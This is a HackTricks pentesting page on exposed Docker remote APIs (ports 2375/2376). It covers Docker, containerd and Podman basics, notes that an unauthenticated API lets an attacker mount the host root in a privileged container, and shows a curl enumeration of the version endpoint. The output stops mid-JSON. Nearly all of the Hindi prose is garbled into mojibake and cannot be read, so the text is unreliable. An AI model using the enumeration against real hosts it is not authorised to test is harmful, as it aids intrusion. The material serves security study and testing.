# 2375, 2376 рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдбреЙрдХрд░

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

## рдбреЙрдХрд░ рдореВрд▓рднреВрдд

### рдХреНрдпрд╛ рд╣реИ

рдбреЙрдХрд░ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдЙрдЪреНрдЪ рдЧрддрд┐ рд╡рд╛рд▓реЗ рдирд╡реАрдирддрдо рдЕрд╡рд┐рд╖реНрдХрд╛рд░ рдХреЗ рд▓рд┐рдП рдЙрджреНрдпрдореЛрдВ рдХреЛ рд╕реБрдЧрдорддрд╛ рд╕реЗ рдХрд┐рд╕реА рднреА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдирд┐рд░реНрдорд┐рдд рдФрд░ рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ - рдкреБрд░рд╛рдиреЗ рд╕реЗ рд▓реЗрдХрд░ рдЖрдиреЗ рд╡рд╛рд▓реЗ рдХреБрдЫ рднреА - рдФрд░ рдЙрдиреНрд╣реЗрдВ рдХрд┐рд╕реА рднреА рд╕реНрдерд╛рди рдкрд░ рд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдЪрд▓рд╛рдиреЗ рдХреАред

### рдореВрд▓ рдбреЙрдХрд░ рд╡рд╛рд╕реНрддреБрдХрд▓рд╛

рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдБ рд╕реЗ](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc) рд╣реИред

* [containerd](http://containerd.io) рдПрдХ рдХрдВрдЯреЗрдирд░ рд░рдирдЯрд╛рдЗрдо рд╣реИ рдЬреЛ рдПрдХ рдкреВрд░реЗ рдХрдВрдЯреЗрдирд░ рдЬреАрд╡рдирдЪрдХреНрд░ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ - рдЫрд╡рд┐ рд╕реНрдерд╛рдирд╛рдВрддрд░рдг/рд╕рдВрдЧреНрд░рд╣ рд╕реЗ рдХрдВрдЯреЗрдирд░ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди, рдкрд░реНрдпрд╡реЗрдХреНрд╖рдг рдФрд░ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧред **рдХрдВрдЯреЗрдирд░рдбреА рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдиреАрдЪреЗ рд╣реИред**
* рдХрдВрдЯреЗрдирд░-рд╢рд┐рдо рд╣реЗрдбрд▓реЗрд╕ рдХрдВрдЯреЗрдирд░ рдХреЛ рд╕рдВрднрд╛рд▓рддрд╛ рд╣реИ, рдЕрд░реНрдерд╛рдд runc рдЬрдм рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЛ рдкреНрд░рд╛рд░рдВрдн рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЛ рдХрдВрдЯреЗрдирд░-рд╢рд┐рдо рдХреЗ рдкрд╛рд╕ рд╕реМрдВрдк рджреЗрддрд╛ рд╣реИ рдЬреЛ рдХреБрдЫ рдордзреНрдпрд╕реНрде рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред
* [runc](http://runc.io) рд╣рд▓реНрдХрд╛ рд╕рд╛рд░реНрд╡рднреМрдорд┐рдХ рд░рди рдЯрд╛рдЗрдо рдХрдВрдЯреЗрдирд░ рд╣реИ, рдЬреЛ OCI рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддрд╛ рд╣реИред **runc рдХрд╛ рдЙрдкрдпреЛрдЧ containerd рджреНрд╡рд╛рд░рд╛ OCI рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдФрд░ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред** рдпрд╣ рд▓рд┐рдмрдХрдВрдЯреЗрдирд░ рдХрд╛ рдкреБрдирд░рд╛рд╡рд▓реЛрдХрди рднреА рд╣реИред
* [grpc](http://www.grpc.io) containerd рдФрд░ рдбреЙрдХрд░-рдЗрдВрдЬрди рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* [OCI](https://www.opencontainers.org) рд░рдирдЯрд╛рдЗрдо рдФрд░ рдЫрд╡рд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП OCI рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рд░рдЦрд░рдЦрд╛рд╡ рдХрд░рддрд╛ рд╣реИред рд╡рд░реНрддрдорд╛рди рдбреЙрдХрд░ рд╕рдВрд╕реНрдХрд░рдг OCI рдЫрд╡рд┐ рдФрд░ рд░рдирдЯрд╛рдЗрдо рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВред

![runC, containerD](https://i.stack.imgur.com/5aXF6.png)

### рдореВрд▓ рдХрдорд╛рдВрдбреНрд╕
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
### Containerd

Containerd рдХрд╛ рдирд┐рд░реНрдорд╛рдг Docker рдФрд░ Kubernetes рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рд╕рд╛рде рд╣реА рдХрд┐рд╕реА рднреА рдЕрдиреНрдп рдХрдВрдЯреЗрдирд░ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдХреЗ рд▓рд┐рдП рдЬреЛ **рдХрдВрдЯреЗрдирд░ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП syscalls рдпрд╛ OS рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЛ abstract рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ** рд▓рд┐рдирдХреНрд╕, рд╡рд┐рдВрдбреЛрдЬ, рд╕реЛрд▓рд░рд┐рд╕, рдпрд╛ рдЕрдиреНрдп OSes рдкрд░ред рдЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦрддреЗ рд╣реБрдП, рд╣рдордиреЗ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд╛ рдХрд┐ containerd рдореЗрдВ рдХреЗрд╡рд▓ рд╡рд╣ рд╣реЛ рдЬреЛ рдЙрдиреНрд╣реЗрдВ рдЪрд╛рд╣рд┐рдП рдФрд░ рдЙрдирдХреЗ рд▓рд┐рдП рдХреБрдЫ рдирд╣реАрдВ рд╣реИред рд╡рд╛рд╕реНрддрд╡рд┐рдХрддрд╛ рдореЗрдВ рдпрд╣ рдЕрд╕рдВрднрд╡ рд╣реИ рд▓реЗрдХрд┐рди рдХрдо рд╕реЗ рдХрдо рдпрд╣реА рд╣рдо рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВред рдЬреИрд╕реЗ рдХрд┐ **рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ containerd рдХреЗ scope рд╕реЗ рдмрд╛рд╣рд░ рд╣реИ**ред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ, рдЬрдм рдЖрдк рдПрдХ рд╡рд┐рддрд░рд┐рдд рд╕рд┐рд╕реНрдЯрдо рдмрдирд╛ рд░рд╣реЗ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рдПрдХ рдмрд╣реБрдд рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкрд╣рд▓реВ рд╣реИред SDN рдФрд░ рд╕реЗрд╡рд╛ рдЦреЛрдЬ рдЖрдЬрдХрд▓, рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рд▓рд┐рдирдХреНрд╕ рдкрд░ netlink рдХреЙрд▓ рдХреЛ abstract рдХрд░рдиреЗ рд╕реЗ рдЕрдзрд┐рдХ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╣реИред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **Docker Containerd рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдХреЗрд╡рд▓ рд╡рд╣реА рд╕реБрд╡рд┐рдзрд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ Docker рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП ContainerD рдореЗрдВ Docker рдХреЗ рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░рдмрдВрдзрди рд╕реБрд╡рд┐рдзрд╛рдПрдБ рдирд╣реАрдВ рд╣реИрдВ, рдФрд░ рди рдЖрдк ContainerD рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Docker swarms рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
### Podman

рдПрдХ рдУрдкрди-рд╕реЛрд░реНрд╕, OCI ([Open Container Initiative](https://github.com/opencontainers)) рдЕрдиреБрд░реВрдк рдХрдВрдЯреЗрдирд░ рдЗрдВрдЬрди рдЬрд┐рд╕реЗ Podman рдХреЗ рдирд╛рдо рд╕реЗ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рд░реЗрдб рд╣реИрдЯ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдпрд╛ рдФрд░ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ Docker рд╕реЗ рдХрдИ рдореБрдЦреНрдп рднрд┐рдиреНрдирддрд╛рдУрдВ рд╕реЗ рдЪрд░рд┐рддреНрд░рд┐рдд рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдЗрд╕рдХрд╛ рдбреЗрдордирд▓реЗрд╕ рд╕рдВрд░рдЪрдирд╛ рдФрд░ рд░реВрдЯ рдПрдХреНрд╕реЗрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рди рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдХрдВрдЯреЗрдирд░реЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рд╢рд╛рдорд┐рд▓ рд╣реИред рджреЛрдиреЛрдВ рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдореБрдЦреНрдп рдХрд╛рд░реНрдп рдЫрд╡рд┐рдпреЛрдВ рдФрд░ рдХрдВрдЯреЗрдирд░реЛрдВ рдХрд╛ рдкреНрд░рдмрдВрдзрди рдХрд░рдирд╛ рд╣реИред Podman рдХрд╛ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд▓рдХреНрд╖реНрдп Docker рдХреЗ API рдХреЗ рд╕рд╛рде рд╕рдВрдЧрддрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ Podman рдореЗрдВ рд▓рдЧрднрдЧ рд╕рднреА Docker CLI рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

Podman рдкрд╛рд░рд┐рд╕реНрдерд┐рддрд┐рдХ рдореЗрдВ, рджреЛ рдЕрддрд┐рд░рд┐рдХреНрдд рдЙрдкрдХрд░рдг, Buildah рдФрд░ Skopeo, рдореМрдЬреВрдж рд╣реИрдВред Buildah рдПрдХ CLI рдЙрдкрдХрд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдХрдВрдЯреЗрдирд░ рдЫрд╡рд┐рдпреЛрдВ рдХреЛ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╛рдо рдЖрддрд╛ рд╣реИ, рдЬрдмрдХрд┐ Skopeo рдХреЛ push, pull, рдпрд╛ inspect рдЬреИрд╕реЗ рдЫрд╡рд┐рдпреЛрдВ рдкрд░ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрди рдЙрдкрдХрд░рдгреЛрдВ рдФрд░ рдЙрдирдХреЗ Podman рдХреЗ рд╕рд╛рде рдПрдХреАрдХрд░рдг рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП, [рдЙрдирдХреЗ GitHub рдкреЗрдЬ рдкрд░ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░реЗрдВ](https://github.com/containers/buildah/tree/master/docs/containertools)ред

**рдореБрдЦреНрдп рднрд┐рдиреНрдирддрд╛рдПрдБ**

Docker рдФрд░ Podman рдХреЗ рдмреАрдЪ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рднрд┐рдиреНрдирддрд╛ рдЙрдирдХреЗ рд╡рд╛рд╕реНрддреБрдХрд▓реНрдкрдирд┐рдХ рдбрд┐рдЬрд╝рд╛рдЗрди рдореЗрдВ рд╣реИред Docker рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд░реНрд╡рд░ рдореЙрдбрд▓ рдкрд░ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЫрд╡рд┐рдпреЛрдВ рдХрд╛ рдирд┐рд░реНрдорд╛рдг рдФрд░ рдХрдВрдЯреЗрдирд░ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдХреЗ рд▓рд┐рдП рдЬрд┐рдореНрдореЗрджрд╛рд░ рдмреИрдХрдЧреНрд░рд╛рдЙрдВрдб рдбреЗрдорди рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХреЗ рд▓рд┐рдП Docker CLI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред рдЙрд▓реНрдЯ, Podman рдПрдХ рдбреЗрдордирд▓реЗрд╕ рд╕рдВрд░рдЪрдирд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЫрд╡рд┐рдпреЛрдВ рдХреЛ рдЖрд░рдВрдн рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдХреНрддрд╛ рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рддрд╣рдд рдмрд┐рдирд╛ рд░реВрдЯ рдПрдХреНрд╕реЗрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдпрд╣ рдбрд┐рдЬрд╝рд╛рдЗрди рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ Podman рдХреЗ рдЙрдкрдпреЛрдХреНрддрд╛рдУрдВ рдХреЗрд╡рд▓ рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, CLI рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рд╕рд╛рдЭрд╛ рдбреЗрдорди рди рд╣реЛред

рдПрдХ рдбреЗрдорди рдХреЗ рдмрд┐рдирд╛ рдкрд┐рдЫрд▓реЗ рдХрдВрдЯреЗрдирд░ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдХреЛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, Podman **systemd** рдХреЗ рд╕рд╛рде рдПрдХреАрдХрд░рдг рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ systemd рдЗрдХрд╛рдЗрдпреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрдВрдЯреЗрдирд░ рдкреНрд░рдмрдВрдзрди рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред рдпрд╣ рдПрдХреАрдХрд░рдг Podman рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рд╕рд╛рде рднрд┐рдиреНрди рд╣реЛрддрд╛ рд╣реИ, рдореМрдЬреВрджрд╛ рдФрд░ рдЕрднреА рддрдХ рди рдмрдирд╛рдП рдЧрдП рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рд▓рд┐рдП рдЗрдХрд╛рдЗрдпреЛрдВ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рд╕рд╛рде рд╣реА systemd рдХреЗ рдХрд╛рд░реНрдп рдХреЛ рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рднреАрддрд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рд╣рд╛рдпрдХ рд╣реЛрддрд╛ рд╣реИред Podman рдХреА рддрд░рд╣, Docker рдкрд░рдВрдкрд░рд╛рдЧрдд рд░реВрдк рд╕реЗ рдбреЗрдорди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкреНрд░рдмрдВрдзрди рдХреЗ рд▓рд┐рдП systemd рдкрд░ рдирд┐рд░реНрднрд░ рд╣реЛрддрд╛ рд╣реИред

рдПрдХ рдФрд░ рдорд╣рддреНрд╡рдкреВрд░реНрдг рднрд┐рдиреНрдирддрд╛ рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдореЗрдВ рд╣реИред Podman рдЙрдкрдпреЛрдХреНрддрд╛ рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рддрд╣рдд рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рди рдХрд┐рд╕реА рдбреЗрдорди рдХреЗ рддрд╣рддред рдЗрд╕рд╕реЗ рд░реВрдЯрд▓реЗрд╕ рдХрдВрдЯреЗрдирд░реЛрдВ рдХреА рдЕрд╡рдзрд╛рд░рдгрд╛ рдкреНрд░рд╕реНрддреБрдд рд╣реЛрддреА рд╣реИ, рдЬрд┐рдиреНрд╣реЗрдВ рдмрд┐рдирд╛ рд░реВрдЯ рдПрдХреНрд╕реЗрд╕ рдХреЗ рдЖрд░рдВрдн рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдХрдВрдЯреЗрдирд░ рдЙрд▓реНрд▓рдВрдШрди рдХреЗ рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡ рдХреЛ рд╕реАрдорд┐рдд рдХрд░рдХреЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рд▓рд╛рдн рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рд░реВрдЯрд▓реЗрд╕ рдХрдВрдЯреЗрдирд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрдВрдЯреЗрдирд░ рдХреЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ рд╣реЛрд╕реНрдЯ рдкрд░ рд╕рд╛рдорд╛рдиреНрдп рдЙрдкрдпреЛрдХреНрддрд╛ рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реЛрддреА рд╣реИ, рдЬреЛ рдЙрдкрдпреЛрдХреНрддрд╛ рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рд╕реЗ рдЖрдЧреЗ рдирд╣реАрдВ рдмрдврд╝рдиреЗ рджреЗрддреА рд╣реИ рдФрд░ рдЗрд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрдврд╝рд╛рддреА рд╣реИред

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ podman рдбреЙрдХрд░ рдХреЗ рд╕рд╛рде рдПрдХ рд╣реА API рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХрд╛ рд▓рдХреНрд╖реНрдп рд░рдЦрддрд╛ рд╣реИ, рдЖрдк podman рдХреЗ рд╕рд╛рде рднреА рдбреЙрдХрд░ рдЬреИрд╕реЗ рд╣реА рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ:
```bash
podman --version
podman info
pdoman images ls
podman ls
```
{% endhint %}

## рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

рджреВрд░рд╕реНрде API рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ 2375 рдкреЛрд░реНрдЯ рдкрд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рдЬрдм рд╕рдХреНрд╖рдо рд╣реЛрддрд╛ рд╣реИред рд╕реЗрд╡рд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрдЧреА, рдЬрд┐рд╕рд╕реЗ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред рджреВрд░рд╕реНрде API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреЛрдИ рднреА рдореЗрдЬрд╝рдмрд╛рди / (рд░реВрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛) рдХреЛ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдореЗрдЬрд╝рдмрд╛рди рдХреЗ рд╡рд╛рддрд╛рд╡рд░рдг рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝ / рд▓рд┐рдЦ рд╕рдХрддрд╛ рд╣реИред

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
## рдЬрд╛рдВрдЪ

### рдореИрдиреНрдпреБрдЕрд▓

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдбреЙрдХрд░ API рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдЖрдк `docker` рдХрдорд╛рдВрдб рдпрд╛ `curl` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersio